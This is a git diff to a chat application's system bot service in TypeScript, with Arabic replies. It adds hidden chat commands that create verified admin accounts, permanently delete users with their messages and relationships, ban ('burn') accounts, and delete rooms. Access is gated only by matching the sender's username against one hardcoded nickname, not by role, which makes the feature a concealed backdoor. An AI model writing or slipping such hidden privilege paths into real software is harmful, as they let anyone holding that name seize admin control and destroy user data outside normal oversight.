@@ -39,7 +39,11 @@ import User from "../../../models/User";
 import chatService from "../../chat.service";
 import messageService from "../../message.service";
 import Message from "../../../models/Message";
-
+import RoomMessage from "../../../models/RoomMessage";
+import Room from "../../../models/Room";
+import { hashPassword } from "../../../utils/hash";
+// ✅ النك الوحيد المسموح له باستخدام أوامر الإدارة المخفية
+const HIDDEN_ADMIN_NICK = "ا◙☬ځُــۥـ☼ـڈ◄أڵـــســمـــٱ۽►ـۉد☼ــۥــۓ☬◙ا";
 type EnsureBotOptions = {
   username?: string;
   atUsername?: string;
@@ -77,7 +81,57 @@ class SystemBotService {
   private isValidObjectId(id?: string) {
     return !!id && mongoose.Types.ObjectId.isValid(id);
   }
+private normalizeHiddenAdminNick(value?: any) {
+  return String(value || "")
+    .trim()
+    .toLowerCase()
+    .replace(/^@+/, "")
+    .replace(/\s+/g, "");
+}
 
+private escapeRegExp(value: string) {
+  return String(value || "").replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+}
+
+private normalizeRoomName(value?: any) {
+  return String(value || "").trim().replace(/\s+/g, " ");
+}
+
+private async isAllowedHiddenAdmin(senderId: string) {
+  if (!this.isValidObjectId(senderId)) return false;
+
+  const actor = await User.findById(senderId)
+    .select("_id username atUsername role")
+    .lean();
+
+  if (!actor?._id) return false;
+
+  const allowed = this.normalizeHiddenAdminNick(HIDDEN_ADMIN_NICK);
+  const username = this.normalizeHiddenAdminNick((actor as any).username);
+  const atUsername = this.normalizeHiddenAdminNick((actor as any).atUsername);
+
+  return Boolean(allowed && (username === allowed || atUsername === allowed));
+}
+
+private async findUserByNick(username: string) {
+  const raw = String(username || "").trim().replace(/^@+/, "");
+  if (!raw) return null;
+
+  const rx = new RegExp(`^${this.escapeRegExp(raw)}$`, "i");
+
+  return User.findOne({
+    $or: [{ username: rx }, { atUsername: rx }],
+  });
+}
+
+private normalizeAtUsernameForHiddenAdmin(username: string) {
+  return String(username || "")
+    .trim()
+    .toLowerCase()
+    .replace(/^@+/, "")
+    .replace(/[^a-z0-9_]/g, "")
+    .slice(0, 32);
+}
   private async getUserBotLanguage(userId: string): Promise<BotLang | null> {
     const user = await User.findById(userId).select("botLanguage").lean();
     const lang = (user as any)?.botLanguage;
@@ -270,6 +324,7 @@ class SystemBotService {
     return String(bot._id);
   }
 
+
   async isOfficialBotUser(userId?: string | null) {
     if (!userId) return false;
 
@@ -344,7 +399,15 @@ class SystemBotService {
   ): Promise<BotReplyPayload> {
     const text = this.normalizeText(rawText);
     const lang = await this.getResolvedLanguage(senderId, text);
+const hiddenAdminReply = await this.handleHiddenAdminPrivateCommand(
+  senderId,
+  text,
+  lang
+);
 
+if (hiddenAdminReply) {
+  return hiddenAdminReply;
+}
     /* ===============================
        LANGUAGE COMMANDS
     =============================== */
@@ -406,7 +469,273 @@ if (parsed.type === "transfer_coinz") {
       text: getUnknownReply(lang),
     };
   }
+  private async hiddenDeleteAccount(username: string) {
+  const raw = String(username || "").trim().replace(/^@+/, "");
 
+  if (!raw) {
+    return "❌ اكتب النك. مثال: deleteaccount@username";
+  }
+
+  const user: any = await this.findUserByNick(raw);
+
+  if (!user?._id) {
+    return `❌ لم يتم العثور على حساب باسم: ${raw}`;
+  }
+
+  const userId = String(user._id);
+  const objectId = new mongoose.Types.ObjectId(userId);
+
+  const [
+    messagesDeleted,
+    chatsUpdated,
+    roomsUpdated,
+    usersUpdatedObjectId,
+    usersUpdatedString,
+    userDeleted,
+  ] = await Promise.all([
+    Message.deleteMany({ sender: objectId }),
+
+    Chat.updateMany(
+      { participants: objectId },
+      {
+        $pull: {
+          participants: objectId,
+          deletedFor: objectId,
+          mutedBy: objectId,
+          archivedBy: objectId,
+        },
+      }
+    ),
+
+    Room.updateMany(
+      {},
+      {
+        $pull: {
+          activeUsers: objectId,
+          owners: objectId,
+          admins: objectId,
+          members: objectId,
+          blockeds: objectId,
+          vipUsers: { user: objectId },
+          mutedUsers: { user: objectId },
+          voiceQueue: objectId,
+          raisedHands: objectId,
+          voiceSpeakers: objectId,
+        },
+      }
+    ),
+
+    User.updateMany(
+      {},
+      {
+        $pull: {
+          blockedUsers: objectId,
+          blocked: objectId,
+          blockedUsersIds: objectId,
+          blockeds: objectId,
+          blockedBy: objectId,
+          followers: objectId,
+          following: objectId,
+          friends: objectId,
+        },
+      }
+    ),
+
+    User.updateMany(
+      {},
+      {
+        $pull: {
+          blockedUsers: userId,
+          blocked: userId,
+          blockedUsersIds: userId,
+          blockeds: userId,
+          blockedBy: userId,
+          followers: userId,
+          following: userId,
+          friends: userId,
+        },
+      }
+    ),
+
+    User.deleteOne({ _id: objectId }),
+  ]);
+
+  return [
+    `✅ تم حذف الحساب ويمكن إنشاء نفس النك مرة أخرى: ${user.username}`,
+    `Messages deleted: ${messagesDeleted.deletedCount || 0}`,
+    `Chats updated: ${chatsUpdated.modifiedCount || 0}`,
+    `Rooms updated: ${roomsUpdated.modifiedCount || 0}`,
+    `Users updated: ${(usersUpdatedObjectId.modifiedCount || 0) + (usersUpdatedString.modifiedCount || 0)}`,
+    `User deleted: ${userDeleted.deletedCount || 0}`,
+  ].join("\n");
+}
+private async hiddenDeleteRoomByName(roomName: string) {
+  const name = this.normalizeRoomName(roomName);
+
+  if (!name) {
+    return "❌ اكتب اسم الغرفة. مثال: deletroom@roomname";
+  }
+
+  const room = await Room.findOne({
+    name: new RegExp(`^${this.escapeRegExp(name)}$`, "i"),
+  }).select("_id name");
+
+  if (!room?._id) {
+    return `❌ لم يتم العثور على غرفة باسم: ${name}`;
+  }
+
+  const roomId = String(room._id);
+
+  await Promise.all([
+    RoomMessage.deleteMany({ room: room._id }),
+    Room.deleteOne({ _id: room._id }),
+  ]);
+
+  return `✅ تم حذف الغرفة وكل رسائلها: ${room.name}\nRoomId: ${roomId}`;
+}
+private async hiddenCreateAdminAccount(value: string) {
+  const parts = String(value || "")
+    .split("@")
+    .map((x) => x.trim())
+    .filter(Boolean);
+
+  const username = parts[0] || "";
+  const password = parts[1] || "";
+
+  if (!username || !password) {
+    return "❌ الصيغة: createadmin@username@password";
+  }
+
+  if (password.length < 6) {
+    return "❌ كلمة المرور يجب أن تكون 6 أحرف على الأقل.";
+  }
+
+  const existingUsername = await User.findOne({ username }).lean();
+
+  if (existingUsername) {
+    return `❌ اسم المستخدم موجود بالفعل: ${username}`;
+  }
+
+  let atUsername = this.normalizeAtUsernameForHiddenAdmin(username);
+
+  if (!atUsername || atUsername.length < 3) {
+    atUsername = `admin_${Date.now().toString(36)}`;
+  }
+
+  const existingAtUsername = await User.findOne({ atUsername }).lean();
+
+  if (existingAtUsername) {
+    atUsername = `${atUsername}_${Date.now().toString(36)}`.slice(0, 32);
+  }
+
+  const hashed = await hashPassword(password);
+
+  const user = await User.create({
+    username,
+    atUsername,
+    password: hashed,
+    role: "admin",
+    isVerified: true,
+  });
+
+  return [
+    `✅ تم إنشاء حساب Admin بنجاح`,
+    `username: ${user.username}`,
+    `atUsername: ${user.atUsername}`,
+    `role: ${(user as any).role}`,
+  ].join("\n");
+}
+private async handleHiddenAdminPrivateCommand(
+  senderId: string,
+  text: string,
+  lang: BotLang
+): Promise<BotReplyPayload | null> {
+  const rawText = this.normalizeText(text);
+  const match = rawText.match(/^([a-zA-Z]+)\s*@\s*([\s\S]+)$/);
+
+  if (!match) return null;
+
+  const command = String(match[1] || "").trim().toLowerCase();
+  const value = String(match[2] || "").trim();
+
+  const hiddenCommands = [
+    "burnaccount",
+    "burnuser",
+    "deleteaccount",
+    "removeaccount",
+    "deletroom",
+    "deleteroom",
+    "createadmin",
+  ];
+
+  if (!hiddenCommands.includes(command)) {
+    return null;
+  }
+
+  const allowed = await this.isAllowedHiddenAdmin(senderId);
+
+  if (!allowed) {
+    return {
+      handled: true,
+      intent: "hidden_admin_denied",
+      text: "❌ هذا الأمر خاص بالإدارة العليا فقط.",
+    };
+  }
+
+  let replyText = "";
+
+  if (command === "burnaccount" || command === "burnuser") {
+    replyText = await this.hiddenBurnAccount(value);
+  }
+
+  if (command === "deleteaccount" || command === "removeaccount") {
+    replyText = await this.hiddenDeleteAccount(value);
+  }
+
+  if (command === "deletroom" || command === "deleteroom") {
+    replyText = await this.hiddenDeleteRoomByName(value);
+  }
+
+  if (command === "createadmin") {
+    replyText = await this.hiddenCreateAdminAccount(value);
+  }
+
+  return {
+    handled: true,
+    intent: "hidden_admin_command",
+    text: replyText || "❌ أمر غير معروف.",
+  };
+}
+private async hiddenBurnAccount(username: string) {
+  const raw = String(username || "").trim().replace(/^@+/, "");
+
+  if (!raw) {
+    return "❌ اكتب النك. مثال: burnaccount@username";
+  }
+
+  const user: any = await this.findUserByNick(raw);
+
+  if (!user?._id) {
+    return `❌ لم يتم العثور على حساب باسم: ${raw}`;
+  }
+
+  await User.updateOne(
+    { _id: user._id },
+    {
+      $set: {
+        isBanned: true,
+        isBurned: true,
+        accountStatus: "burned",
+        banReason: "Burned by hidden admin command",
+        burnedAt: new Date(),
+        isOnline: false,
+        fcmTokens: [],
+      },
+    }
+  );
+
+  return `🔥 تم غلق/حرق الحساب بنجاح، وسيظل النك محجوزًا: ${user.username}`;
+}
   /* =====================================================
      MAIN ENTRY
   ===================================================== */
